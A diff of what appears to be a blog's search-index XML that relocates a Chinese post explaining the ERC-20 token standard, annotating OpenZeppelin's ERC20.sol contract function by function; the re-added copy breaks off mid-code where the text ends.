@@ -125,79 +125,6 @@
       </categories>
   </entry>
   <entry>
-    <title>浅析ERC-20</title>
-    <url>/2023/12/03/%E6%B5%85%E6%9E%90ERC-20/</url>
-    <content><![CDATA[<h2 id="关于-ERC-20"><a href="#关于-ERC-20" class="headerlink" title="关于 ERC-20"></a>关于 ERC-20</h2><p>GitHub：<a class="link"   href="https://github.com/ethereum/ercs/blob/master/ERCS/erc-20.md" >ethereum&#x2F;ERCS&#x2F;erc-20.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p>代币在以太坊中十分重要，它可以与现实中的价值互相换算，也可以纯粹地表示一个虚拟的数值。</p>
-<p>ERC-20（Ethereum Request for Comments 20）是一个以太坊代币的标准，由 Fabian Vogelsteller 于2015年11月提出，是一种代币标准，为智能合约中的代币实现 API。</p>
-<p>一个符合 ERC-20 标准的代币合约，至少要实现以下功能：</p>
-<ul>
-<li>代币的转移，从一个账户到另一个账户</li>
-<li>获取当前账户的余额</li>
-<li>获取该代币的总供应量</li>
-<li>授权给第三方账户使用账户中一定数量的代币</li>
-</ul>
-<h2 id="ERC20-in-OpenZeppelin-Contracts"><a href="#ERC20-in-OpenZeppelin-Contracts" class="headerlink" title="ERC20 in OpenZeppelin Contracts"></a>ERC20 in OpenZeppelin Contracts</h2><p>GitHub：<a class="link"   href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol" >openzeppelin-contracts&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import &#123;IERC20&#125; from &quot;./IERC20.sol&quot;;</span><br><span class="line">import &#123;IERC20Metadata&#125; from &quot;./extensions/IERC20Metadata.sol&quot;;</span><br><span class="line">import &#123;Context&#125; from &quot;../../utils/Context.sol&quot;;</span><br><span class="line">import &#123;IERC20Errors&#125; from &quot;../../interfaces/draft-IERC6093.sol&quot;;</span><br><span class="line"></span><br><span class="line">abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors &#123;</span><br><span class="line">    mapping(address account =&gt; uint256) private _balances;</span><br><span class="line">    // 映射：余额</span><br><span class="line"></span><br><span class="line">    mapping(address account =&gt; mapping(address spender =&gt; uint256)) private _allowances;</span><br><span class="line">    // 映射：授权余额，account对spender授权的余额，即前者允许后者访问一定数量的代币</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line">    // 总供应量</span><br><span class="line"></span><br><span class="line">    string private _name;</span><br><span class="line">    // 代币名称</span><br><span class="line">    string private _symbol;</span><br><span class="line">    // 代币符号</span><br><span class="line"></span><br><span class="line">    constructor(string memory name_, string memory symbol_) &#123;</span><br><span class="line">        // 构造函数初始化名称和符号</span><br><span class="line">        _name = name_;</span><br><span class="line">        _symbol = symbol_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function name() public view virtual returns (string memory) &#123;</span><br><span class="line">        // name的getter</span><br><span class="line">        return _name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function symbol() public view virtual returns (string memory) &#123;</span><br><span class="line">        // symbol的getter</span><br><span class="line">        return _symbol;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function decimals() public view virtual returns (uint8) &#123;</span><br><span class="line">        // 小数位</span><br><span class="line">        return 18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view virtual returns (uint256) &#123;</span><br><span class="line">        // 总供应量的getter</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) public view virtual returns (uint256) &#123;</span><br><span class="line">        // 余额getter</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">        // 转账函数，可重写，调用内部函数_transfer()</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        _transfer(owner, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender) public view virtual returns (uint256) &#123;</span><br><span class="line">        // 授权映射的getter</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">        // 授权函数，可重写，调用内部函数_approve()</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        _approve(owner, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">        // 从from地址转出value数量到to地址，调用内部函数_transfer()</span><br><span class="line">        address spender = _msgSender();</span><br><span class="line">        _spendAllowance(from, spender, value);</span><br><span class="line">        _transfer(from, to, value);</span><br><span class="line">        // 注意这里_transfer()从from转到to，扣除了spender的allowance和from的balance</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address from, address to, uint256 value) internal &#123;</span><br><span class="line">        // 内部函数，检测到空地址即抛出异常，调用内部函数）_update()</span><br><span class="line">        if (from == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidSender(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        if (to == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidReceiver(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        _update(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _update(address from, address to, uint256 value) internal virtual &#123;</span><br><span class="line">        // 内部函数，转移代币的核心功能</span><br><span class="line">        if (from == address(0)) &#123;</span><br><span class="line">            // from为空地址时，凭空产生代币，总供应量增加。这里对应的就是_mint()</span><br><span class="line">            // Overflow check required: The rest of the code assumes that totalSupply never overflows</span><br><span class="line">            _totalSupply += value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            uint256 fromBalance = _balances[from];</span><br><span class="line">            if (fromBalance &lt; value) &#123;</span><br><span class="line">                // 不够钱</span><br><span class="line">                revert ERC20InsufficientBalance(from, fromBalance, value);</span><br><span class="line">            &#125;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                // 排除溢出的可能，所以可以使用unchecked</span><br><span class="line">                // Overflow not possible: value &lt;= fromBalance &lt;= totalSupply.</span><br><span class="line">                _balances[from] = fromBalance - value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (to == address(0)) &#123;</span><br><span class="line">            // to为空地址时，销毁代币，总供应量减少。这里对应的就是_burn()</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _totalSupply -= value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _balances[to] += value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">        // 触发Transfer事件</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 value) internal &#123;</span><br><span class="line">        // 产生代币</span><br><span class="line">        if (account == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidReceiver(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        _update(address(0), account, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _burn(address account, uint256 value) internal &#123;</span><br><span class="line">        // 销毁代币</span><br><span class="line">        if (account == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidSender(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        _update(account, address(0), value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address owner, address spender, uint256 value) internal &#123;</span><br><span class="line">        // 授权额度，去调用它的一个重写，emitEvent默认传入true</span><br><span class="line">        _approve(owner, spender, value, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual &#123;</span><br><span class="line">        // 比另一个_approve()多出一个bool参数emitEvent，用于选择是否触发Approval事件</span><br><span class="line">        if (owner == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidApprover(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        if (spender == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidSpender(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        _allowances[owner][spender] = value; // 基于spender相应代币数量的授权</span><br><span class="line">        if (emitEvent) &#123;</span><br><span class="line">            emit Approval(owner, spender, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _spendAllowance(address owner, address spender, uint256 value) internal virtual &#123;</span><br><span class="line">        // 花费授权的额度，内部函数</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">            if (currentAllowance &lt; value) &#123;</span><br><span class="line">                revert ERC20InsufficientAllowance(spender, currentAllowance, value);</span><br><span class="line">            &#125;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - value, false);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>以上是 OpenZeppelin Contracts 的 ERC20.sol，我隐去了代码中开发者留下的详细英文注释，取而代之的是一些简洁的注释，有误敬请斧正。</p>
-<h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">string private _name;</span><br><span class="line">string private _symbol;</span><br><span class="line"></span><br><span class="line">constructor(string memory name_, string memory symbol_) &#123;</span><br><span class="line">    _name = name_;</span><br><span class="line">    _symbol = symbol_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>构造函数，接收<code>name_</code>和<code>symbol_</code>两个参数，初始化代币的名称和符号。</p>
-<h3 id="public-函数"><a href="#public-函数" class="headerlink" title="public 函数"></a>public 函数</h3><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">string private _name;</span><br><span class="line"></span><br><span class="line">function name() public view virtual returns (string memory) &#123;</span><br><span class="line">    return _name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>返回代币名称。</p>
-<h4 id="symbol"><a href="#symbol" class="headerlink" title="symbol"></a>symbol</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">string private _symbol;</span><br><span class="line"></span><br><span class="line">function symbol() public view virtual returns (string memory) &#123;</span><br><span class="line">    return _symbol;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>返回代币符号。</p>
-<h4 id="decimals"><a href="#decimals" class="headerlink" title="decimals"></a>decimals</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function decimals() public view virtual returns (uint8) &#123;</span><br><span class="line">    return 18;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>返回代币使用的小数位数。</p>
-<h4 id="totalSupply"><a href="#totalSupply" class="headerlink" title="totalSupply"></a>totalSupply</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 private _totalSupply;</span><br><span class="line"></span><br><span class="line">function totalSupply() public view virtual returns (uint256) &#123;</span><br><span class="line">    return _totalSupply;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>返回代币总供应量。</p>
-<h4 id="balanceOf"><a href="#balanceOf" class="headerlink" title="balanceOf"></a>balanceOf</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(address account =&gt; uint256) private _balances;</span><br><span class="line"></span><br><span class="line">function balanceOf(address account) public view virtual returns (uint256) &#123;</span><br><span class="line">    return _balances[account];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>从<code>_balances</code>映射中返回相应账户的余额。</p>
-<h4 id="transfer"><a href="#transfer" class="headerlink" title="transfer"></a>transfer</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address owner = _msgSender();</span><br><span class="line">    _transfer(owner, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>转账函数，可见性为<code>public</code>，用于获取目前的<code>msg.sender</code>并将其作为<code>from</code>参数传入内部函数<code>_transfer</code>，以执行下一步转账操作。</p>
-<h4 id="allowance"><a href="#allowance" class="headerlink" title="allowance"></a>allowance</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(address account =&gt; mapping(address spender =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">function allowance(address owner, address spender) public view virtual returns (uint256) &#123;</span><br><span class="line">    return _allowances[owner][spender];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>从<code>_allowances</code>映射中返回相应授权者账户和被授权账户的授权额。</p>
-<h4 id="approve"><a href="#approve" class="headerlink" title="approve"></a>approve</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function approve(address spender, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address owner = _msgSender();</span><br><span class="line">    _approve(owner, spender, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>授权函数，可见性为<code>public</code>，用于获取目前的<code>msg.sender</code>并将其作为<code>owner</code>参数传入内部函数<code>_approve</code>，以执行下一步授权操作。</p>
-<h4 id="transferFrom"><a href="#transferFrom" class="headerlink" title="transferFrom"></a>transferFrom</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address spender = _msgSender();</span><br><span class="line">    _spendAllowance(from, spender, value);</span><br><span class="line">    _transfer(from, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>使用授权的代币进行转账，获取当前<code>msg.sender</code>作为<code>spender</code>参数传入内部函数<code>_spendAllowance</code>，执行成功后再调用<code>_transfer</code>内部函数转移代币。</p>
-<h3 id="internal-函数"><a href="#internal-函数" class="headerlink" title="internal 函数"></a>internal 函数</h3><h4 id="transfer-1"><a href="#transfer-1" class="headerlink" title="_transfer"></a>_transfer</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(address from, address to, uint256 value) internal &#123;</span><br><span class="line">    if (from == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    if (to == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidReceiver(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(from, to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>内部函数，判断<code>from</code>和<code>to</code>是否为空地址，是则<code>revert</code>，否则调用内部函数<code>_update</code>，执行下一步转账操作。</p>
-<h4 id="update"><a href="#update" class="headerlink" title="_update"></a>_update</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _update(address from, address to, uint256 value) internal virtual &#123;</span><br><span class="line">    if (from == address(0)) &#123;</span><br><span class="line">        _totalSupply += value;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        if (fromBalance &lt; value) &#123;</span><br><span class="line">            revert ERC20InsufficientBalance(from, fromBalance, value);</span><br><span class="line">        &#125;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[from] = fromBalance - value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (to == address(0)) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _totalSupply -= value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[to] += value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    emit Transfer(from, to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>代币转移的核心代码，内部函数。第一个 if 中判断<code>from</code>是否为空地址，是则凭空产生代币，另一个内部函数<code>_mint</code>会这样调用它。else 中是既不产生代币也不销毁代币的正常转账，判断<code>fromBalance</code>足够即可转账。第二个 if 中判断<code>to</code>是否为空地址，是则销毁代币，另一个内部函数<code>_burn</code>会这样调用它。执行完代币转移的操作后，触发一个 Transfer 事件。</p>
-<h4 id="mint"><a href="#mint" class="headerlink" title="_mint"></a>_mint</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _mint(address account, uint256 value) internal &#123;</span><br><span class="line">    if (account == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidReceiver(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(address(0), account, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>内部函数，用于凭空在一个账户的余额中生成代币，传入的账户为空地址则 revert，否则直接去调用<code>_update</code>。</p>
-<h4 id="burn"><a href="#burn" class="headerlink" title="_burn"></a>_burn</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _burn(address account, uint256 value) internal &#123;</span><br><span class="line">    if (account == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(account, address(0), value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>内部函数，用于销毁一个账户中的代币余额，传入的账户地址为空地址则 revert，否则直接去调用<code>_update</code>。</p>
-<h4 id="approve-1"><a href="#approve-1" class="headerlink" title="_approve"></a>_approve</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _approve(address owner, address spender, uint256 value) internal &#123;</span><br><span class="line">    _approve(owner, spender, value, true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual &#123;</span><br><span class="line">    if (owner == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidApprover(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    if (spender == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSpender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _allowances[owner][spender] = value;</span><br><span class="line">    if (emitEvent) &#123;</span><br><span class="line">        emit Approval(owner, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>内部函数，用于将<code>owner</code>的一定量代币授权给<code>spender</code>，有两种用法，目的是使<code>emitEvent</code>缺省为 true。</p>
-<h4 id="spendAllowance"><a href="#spendAllowance" class="headerlink" title="_spendAllowance"></a>_spendAllowance</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _spendAllowance(address owner, address spender, uint256 value) internal virtual &#123;</span><br><span class="line">    uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">    if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">        if (currentAllowance &lt; value) &#123;</span><br><span class="line">            revert ERC20InsufficientAllowance(spender, currentAllowance, value);</span><br><span class="line">        &#125;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _approve(owner, spender, currentAllowance - value, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>内部函数，当被授权者使用<code>transferFrom</code>函数，转移其被授权的代币时被调用，用于扣除其相应的授权额度。</p>
-]]></content>
-      <categories>
-        <category>区块链</category>
-      </categories>
-      <tags>
-        <tag>solidity</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>区块链安全基础备忘</title>
     <url>/2023/10/05/%E5%9F%BA%E7%A1%80%E5%A4%87%E5%BF%98/</url>
     <content><![CDATA[<h2 id="基础名词"><a href="#基础名词" class="headerlink" title="基础名词"></a>基础名词</h2><h3 id="钱包-Wallet"><a href="#钱包-Wallet" class="headerlink" title="钱包 Wallet"></a>钱包 Wallet</h3><p>是一个管理私钥的工具，允许通过其检查、存储、交易持有的数字货币。它是进入区块链世界的基础设施和重要入口。</p>
@@ -278,6 +205,79 @@
       <categories>
         <category>区块链</category>
       </categories>
+  </entry>
+  <entry>
+    <title>浅析ERC-20</title>
+    <url>/2023/12/03/%E6%B5%85%E6%9E%90ERC-20/</url>
+    <content><![CDATA[<h2 id="关于-ERC-20"><a href="#关于-ERC-20" class="headerlink" title="关于 ERC-20"></a>关于 ERC-20</h2><p>GitHub：<a class="link"   href="https://github.com/ethereum/ercs/blob/master/ERCS/erc-20.md" >ethereum&#x2F;ERCS&#x2F;erc-20.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>代币在以太坊中十分重要，它可以与现实中的价值互相换算，也可以纯粹地表示一个虚拟的数值。</p>
+<p>ERC-20（Ethereum Request for Comments 20）是一个以太坊代币的标准，由 Fabian Vogelsteller 于2015年11月提出，是一种代币标准，为智能合约中的代币实现 API。</p>
+<p>一个符合 ERC-20 标准的代币合约，至少要实现以下功能：</p>
+<ul>
+<li>代币的转移，从一个账户到另一个账户</li>
+<li>获取当前账户的余额</li>
+<li>获取该代币的总供应量</li>
+<li>授权给第三方账户使用账户中一定数量的代币</li>
+</ul>
+<h2 id="ERC20-in-OpenZeppelin-Contracts"><a href="#ERC20-in-OpenZeppelin-Contracts" class="headerlink" title="ERC20 in OpenZeppelin Contracts"></a>ERC20 in OpenZeppelin Contracts</h2><p>GitHub：<a class="link"   href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol" >openzeppelin-contracts&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import &#123;IERC20&#125; from &quot;./IERC20.sol&quot;;</span><br><span class="line">import &#123;IERC20Metadata&#125; from &quot;./extensions/IERC20Metadata.sol&quot;;</span><br><span class="line">import &#123;Context&#125; from &quot;../../utils/Context.sol&quot;;</span><br><span class="line">import &#123;IERC20Errors&#125; from &quot;../../interfaces/draft-IERC6093.sol&quot;;</span><br><span class="line"></span><br><span class="line">abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors &#123;</span><br><span class="line">    mapping(address account =&gt; uint256) private _balances;</span><br><span class="line">    // 映射：余额</span><br><span class="line"></span><br><span class="line">    mapping(address account =&gt; mapping(address spender =&gt; uint256)) private _allowances;</span><br><span class="line">    // 映射：授权余额，account对spender授权的余额，即前者允许后者访问一定数量的代币</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line">    // 总供应量</span><br><span class="line"></span><br><span class="line">    string private _name;</span><br><span class="line">    // 代币名称</span><br><span class="line">    string private _symbol;</span><br><span class="line">    // 代币符号</span><br><span class="line"></span><br><span class="line">    constructor(string memory name_, string memory symbol_) &#123;</span><br><span class="line">        // 构造函数初始化名称和符号</span><br><span class="line">        _name = name_;</span><br><span class="line">        _symbol = symbol_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function name() public view virtual returns (string memory) &#123;</span><br><span class="line">        // name的getter</span><br><span class="line">        return _name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function symbol() public view virtual returns (string memory) &#123;</span><br><span class="line">        // symbol的getter</span><br><span class="line">        return _symbol;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function decimals() public view virtual returns (uint8) &#123;</span><br><span class="line">        // 小数位</span><br><span class="line">        return 18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view virtual returns (uint256) &#123;</span><br><span class="line">        // 总供应量的getter</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) public view virtual returns (uint256) &#123;</span><br><span class="line">        // 余额getter</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">        // 转账函数，可重写，调用内部函数_transfer()</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        _transfer(owner, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender) public view virtual returns (uint256) &#123;</span><br><span class="line">        // 授权映射的getter</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">        // 授权函数，可重写，调用内部函数_approve()</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        _approve(owner, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">        // 从from地址转出value数量到to地址，调用内部函数_transfer()</span><br><span class="line">        address spender = _msgSender();</span><br><span class="line">        _spendAllowance(from, spender, value);</span><br><span class="line">        _transfer(from, to, value);</span><br><span class="line">        // 注意这里_transfer()从from转到to，扣除了spender的allowance和from的balance</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address from, address to, uint256 value) internal &#123;</span><br><span class="line">        // 内部函数，检测到空地址即抛出异常，调用内部函数）_update()</span><br><span class="line">        if (from == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidSender(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        if (to == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidReceiver(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        _update(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _update(address from, address to, uint256 value) internal virtual &#123;</span><br><span class="line">        // 内部函数，转移代币的核心功能</span><br><span class="line">        if (from == address(0)) &#123;</span><br><span class="line">            // from为空地址时，凭空产生代币，总供应量增加。这里对应的就是_mint()</span><br><span class="line">            // Overflow check required: The rest of the code assumes that totalSupply never overflows</span><br><span class="line">            _totalSupply += value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            uint256 fromBalance = _balances[from];</span><br><span class="line">            if (fromBalance &lt; value) &#123;</span><br><span class="line">                // 不够钱</span><br><span class="line">                revert ERC20InsufficientBalance(from, fromBalance, value);</span><br><span class="line">            &#125;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                // 排除溢出的可能，所以可以使用unchecked</span><br><span class="line">                // Overflow not possible: value &lt;= fromBalance &lt;= totalSupply.</span><br><span class="line">                _balances[from] = fromBalance - value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (to == address(0)) &#123;</span><br><span class="line">            // to为空地址时，销毁代币，总供应量减少。这里对应的就是_burn()</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _totalSupply -= value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _balances[to] += value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">        // 触发Transfer事件</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 value) internal &#123;</span><br><span class="line">        // 产生代币</span><br><span class="line">        if (account == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidReceiver(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        _update(address(0), account, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _burn(address account, uint256 value) internal &#123;</span><br><span class="line">        // 销毁代币</span><br><span 